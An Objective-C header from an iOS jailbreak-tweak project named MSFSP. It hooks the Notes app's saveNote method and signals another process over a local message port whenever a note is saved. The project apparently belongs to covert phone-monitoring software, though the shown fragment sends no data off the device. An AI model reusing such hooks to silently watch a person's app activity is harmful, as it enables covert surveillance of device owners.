//
//  Note.h
//  MSFSP
//
//  Created by Makara Khloth on 12/21/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "NotesDisplayController.h"

#import "MessagePortIPCSender.h"
#import "DefStd.h"

//HOOK(NotesDisplayController, addButtonClicked$, void, id arg1) {
//	DLog(@"!!!!!!!!!! addButtonClicked$ is called.. %@", [NSDate date]);
//	CALL_ORIG(NotesDisplayController, addButtonClicked$, arg1);
//	
//	MessagePortIPCSender *s = [[MessagePortIPCSender alloc] initWithPortName:kNoteACMessagePort];
//	[s writeDataToPort:[NSData data]];
//	[s release];
//}

HOOK(NotesDisplayController, saveNote, void) {
//	DLog(@"!!!!!!!!!! saveNote is called.. %@", [NSDate date]);
	DLog(@"!!!!!!!!!! saveNote is called..");
	CALL_ORIG(NotesDisplayController, saveNote);	
	
	MessagePortIPCSender *s = [[MessagePortIPCSender alloc] initWithPortName:kNoteACMessagePort];
	[s writeDataToPort:[NSData data]];
	[s release];
}
